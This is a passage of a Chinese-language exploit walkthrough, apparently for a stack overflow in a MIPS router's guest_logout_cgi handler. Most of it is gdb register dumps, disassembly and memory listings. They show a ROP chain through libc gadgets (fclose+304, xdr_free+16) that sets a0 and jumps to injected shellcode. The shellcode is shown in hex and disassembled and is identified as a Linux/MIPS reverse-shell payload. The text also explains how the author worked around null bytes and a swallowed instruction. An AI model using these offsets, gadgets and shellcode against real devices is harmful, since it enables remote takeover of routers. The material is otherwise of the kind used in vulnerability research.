     T0   0xfd00
     T1   0x77a71411 ?— 0x6c5f5f00
     T2   0x77ee5f89 ?— jalx   0x79957c00
     T3   0x77ff5a60 —? 0x77a6a000 ?— 0x464c457f
     T4   0x77a6c64c ?— 0x88e
     T5   0x24
     T6   0xd80b684
     T7   0x77a70b7c ?— 0x4c475f00
     T8   0x77a6c40c ?— nop    
     T9   0x77a984d0 (strcoll) ?— lbu    $v1, ($a0)
     S0   0x77aa7050 (xdr_free+16) ?— move   $t9, $a0     //jmp $a0
     S1   0x61616161 ('aaaa')
     S2   0x61616161 ('aaaa')
     S3   0x61616161 ('aaaa')
     S4   0x61616161 ('aaaa')
     S5   0x61616161 ('aaaa')
     S6   0x61616161 ('aaaa')
     S7   0x61616161 ('aaaa')
     S8   0x61616161 ('aaaa')
     FP   0x7fff1348 ?— 0x61616161 ('aaaa')
     SP   0x7fff1260 —? 0x47c14c ?— 'http_client_ip'
     PC   0x431b60 (guest_logout_cgi+872) ?— jr     $ra
    ───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
       0x431b4c     lw     $s3, 0xcc($sp)
       0x431b50     lw     $s2, 0xc8($sp)
       0x431b54     lw     $s1, 0xc4($sp)
       0x431b58     lw     $s0, 0xc0($sp)
       0x431b5c     move   $v0, $zero
     ? 0x431b60     jr     $ra 
        ↓
       0x431b68     lw     $t9, -0x7cc0($gp)
       0x431b6c     nop    
       0x431b70     jalr   $t9
       0x431b74     move   $a0, $s2
**可以看到此时ra寄存器的值已经是0x77a8f7a0
就是jalrs0也被我们提前布置好了地址**，覆盖到PC可以通过cyclic算出来，但覆盖到S0需要自己去手动调试，慢慢找它的偏移。
     V0   0x0
     V1   0x73
     A0   0x4d81f0 (post_buf+64) ?— 0x75746174 ('tatu')
     A1   0x47f785 ?— 'ogin_guest.asp'
     A2   0x0
     A3   0x0
     T0   0xfd00
     T1   0x77a71411 ?— 0x6c5f5f00
     T2   0x77ee5f89 ?— jalx   0x79957c00
     T3   0x77ff5a60 —? 0x77a6a000 ?— 0x464c457f
     T4   0x77a6c64c ?— 0x88e
     T5   0x24
     T6   0xd80b684
     T7   0x77a70b7c ?— 0x4c475f00
     T8   0x77a6c40c ?— nop    
     T9   0x77a984d0 (strcoll) ?— lbu    $v1, ($a0)
     S0   0x77aa7050 (xdr_free+16) ?— move   $t9, $a0
     S1   0x61616161 ('aaaa')
     S2   0x61616161 ('aaaa')
     S3   0x61616161 ('aaaa')
     S4   0x61616161 ('aaaa')
     S5   0x61616161 ('aaaa')
     S6   0x61616161 ('aaaa')
     S7   0x61616161 ('aaaa')
     S8   0x61616161 ('aaaa')
     FP   0x7fff13a0 ?— 0x109090c
     SP   0x7fff1348 ?— 0x61616161 ('aaaa')
     PC   0x77a8f7a0 (fclose+304) ?— addiu  $a0, $sp, 0x18
    ───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
     ? 0x77a8f7a0     addiu  $a0, $sp, 0x18 
        ↓
       0x77a8f7a8     jalr   $t9
       0x77a8f7ac     addiu  $a1, $zero, 1
       0x77a8f7b0     lw     $gp, 0x10($sp)
       0x77a8f7b4     lhu    $v0, ($s1)
       0x77a8f7b8     andi   $v0, $v0, 0x4000
       0x77a8f7bc     beqz   $v0, fclose+360 
       0x77a8f7c0     lw     $a2, -0x778c($gp)
       0x77a8f7c4     lw     $t9, -0x77ac($gp)
       0x77a8f7c8     jalr   $t9
       0x77a8f7cc     lw     $a0, 8($s1)
    ────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
    00:0000│ sp  0x7fff1348 ?— 0x61616161 ('aaaa')
    ... ↓
    06:0018│     0x7fff1360 ?— 0x2804ffff
    ... ↓
**这里是把$sp+0x18的位置给a0寄存器，也就是我们要跳的最后位置**
    Python 2.7.12 (default, Oct  5 2020, 13:56:01) 
    [GCC 5.4.0 20160609] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> print(hex(0x7fff1348+0x18))
    0x7fff1360
    看了下地址0x7fff1360没毛病
    gdb-peda$ x/20wx 0x7fff1348
    0x7fff1348: 0x61616161  0x61616161  0x61616161  0x61616161
    0x7fff1358: 0x61616161  0x61616161  0x2804ffff  0x2804ffff
    0x7fff1368: 0x24020fa6  0x0109090c  0x28041111  0x24020fa6
    0x7fff1378: 0x0109090c  0x240cfffd  0x01802027  0x24020fa6
    0x7fff1388: 0x0109090c  0x240cfffd  0x01802027  0x01802827
    gdb-peda$ x/20wx 0x7fff1348+0x18
    0x7fff1360: 0x2804ffff  0x2804ffff  0x24020fa6  0x0109090c
    0x7fff1370: 0x28041111  0x24020fa6  0x0109090c  0x240cfffd
    0x7fff1380: 0x01802027  0x24020fa6  0x0109090c  0x240cfffd
    0x7fff1390: 0x01802027  0x01802827  0x2806ffff  0x24021057
    0x7fff13a0: 0x0109090c  0x3044ffff  0x24020fc9  0x0109090c
    gdb-peda$ x/20i 0x7fff1348+0x18
       0x7fff1360:  slti    a0,zero,-1
       0x7fff1364:  slti    a0,zero,-1
       0x7fff1368:  li  v0,4006
       0x7fff136c:  syscall 0x42424
       0x7fff1370:  slti    a0,zero,4369
       0x7fff1374:  li  v0,4006
       0x7fff1378:  syscall 0x42424
       0x7fff137c:  li  t4,-3
       0x7fff1380:  nor a0,t4,zero
       0x7fff1384:  li  v0,4006
       0x7fff1388:  syscall 0x42424
       0x7fff138c:  li  t4,-3
       0x7fff1390:  nor a0,t4,zero
       0x7fff1394:  nor a1,t4,zero
       0x7fff1398:  slti    a2,zero,-1
       0x7fff139c:  li  v0,4183
       0x7fff13a0:  syscall 0x42424
       0x7fff13a4:  andi    a0,v0,0xffff
       0x7fff13a8:  li  v0,4041
       0x7fff13ac:  syscall 0x42424
这里是比较关键的一步在栈顶+0x18的位置，将shellcode的第一条指令多写了一份，因为在调试的过程中发现，slti
a0,zero,-1这条指令会被莫名奇妙吞掉，所以多写了一条指令，来绕过这个奇怪的机制，实际测试过程中遇到\x00也会给截断，所以也需要绕00，这里测试过我的msf生成的是有00的，所以直接用轩哥推荐的shellcode[Linux/mips
- Reverse Shell Shellcode - 200 bytes by Jacob Holcomb](http://shell-storm.org/shellcode/files/shellcode-860.php)
    V0   0x0
     V1   0x73
     A0   0x7fff1360 ?— 0x2804ffff
     A1   0x47f785 ?— 'ogin_guest.asp'
     A2   0x0
     A3   0x0
     T0   0xfd00
     T1   0x77a71411 ?— 0x6c5f5f00
     T2   0x77ee5f89 ?— jalx   0x79957c00
     T3   0x77ff5a60 —? 0x77a6a000 ?— 0x464c457f
     T4   0x77a6c64c ?— 0x88e
     T5   0x24
     T6   0xd80b684
     T7   0x77a70b7c ?— 0x4c475f00
     T8   0x77a6c40c ?— nop    
     T9   0x77a984d0 (strcoll) ?— lbu    $v1, ($a0)
     S0   0x77aa7050 (xdr_free+16) ?— move   $t9, $a0
     S1   0x61616161 ('aaaa')
     S2   0x61616161 ('aaaa')
     S3   0x61616161 ('aaaa')
     S4   0x61616161 ('aaaa')
     S5   0x61616161 ('aaaa')
     S6   0x61616161 ('aaaa')
     S7   0x61616161 ('aaaa')
     S8   0x61616161 ('aaaa')
     FP   0x7fff13a0 ?— 0x109090c
     SP   0x7fff1348 ?— 0x61616161 ('aaaa')
     PC   0x77a8f7a4 (fclose+308) ?— move   $t9, $s0
    ───────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
       0x77a8f7a0     addiu  $a0, $sp, 0x18
     ? 0x77a8f7a4     move   $t9, $s0
        ↓
       0x77a8f7ac     addiu  $a1, $zero, 1
       0x77a8f7b0     lw     $gp, 0x10($sp)
       0x77a8f7b4     lhu    $v0, ($s1)
       0x77a8f7b8     andi   $v0, $v0, 0x4000
       0x77a8f7bc     beqz   $v0, fclose+360 
       0x77a8f7c0     lw     $a2, -0x778c($gp)
       0x77a8f7c4     lw     $t9, -0x77ac($gp)
       0x77a8f7c8     jalr   $t9
       0x77a8f7cc     lw     $a0, 8($s1)
    ────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
    00:0000│ sp  0x7fff1348 ?— 0x61616161 ('aaaa')
    ... ↓
    06:0018│ a0  0x7fff1360 ?— 0x2804ffff
    ... ↓
    ──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
     ? f 0 77a8f7a4 fclose+308
**到这里a0已经变成了我们想要的地址了**
    0x77aa7058 in xdr_free () from target:/lib/libc.so.0
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ──────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────
     V0   0x0
     V1   0x73
     A0   0x7fff1360 ?— 0x0
     A1   0x1
     A2   0x0
     A3   0x0
     T0   0xfd00
     T1   0x77a71411 ?— 0x6c5f5f00
     T2   0x77ee5f89 ?— jalx   0x79957c00
     T3   0x77ff5a60 —? 0x77a6a000 ?— 0x464c457f
     T4   0x77a6c64c ?— 0x88e
     T5   0x24
     T6   0xd80b684
     T7   0x77a70b7c ?— 0x4c475f00
     T8   0x77a6c40c ?— nop    
     T9   0x7fff1360 ?— 0x0
     S0   0x77aa7050 (xdr_free+16) ?— move   $t9, $a0
     S1   0x61616161 ('aaaa')